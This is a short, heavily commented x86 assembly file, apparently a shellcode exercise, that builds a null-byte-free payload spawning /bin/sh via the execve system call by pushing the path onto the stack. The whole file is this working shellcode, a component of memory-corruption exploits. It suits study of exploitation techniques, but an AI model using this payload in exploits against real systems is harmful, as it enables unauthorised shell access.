; int execve(const char *pathname, char *const argv[], char *const envp[]);
;     EAX                 EBX                 ECX                 EDX
; We setup the two last args aka ECX and EDX as NULL bcz we dont use them
; we pass /bin/sh in EBX (its a filename and should end with a NULL terminator).
; we pass 11 in EAX which is execve syscall value



global _start

_start:
	xor eax, eax            ; emptying EAX so we dont have extra zeroes when crafting the shelcode from it
	mov edx, eax            ; EDX need to be setup as NULL
	mov ecx, eax            ; ECX needs to be setup to NULL too
	
	mov al, 11              ; syscall value for execve(), need to be in EAX
	
	push edx                ; 0      => EDX contains the "\0" null terminator that will be taken after /bin//sh to produce '/bin//sh\0' 
	push 0x68732f2f         ; hs//   => it will appear like this on the stack, not in reversed order.
	push 0x6e69622f         ; nib/   => after executing this instruction esp will point to /bin//sh
	
	mov ebx, esp            ; ebx will now point to /bin//sh 
	
	int 0x80                ; interrupt to trigger the system call using the value stored in EAX 
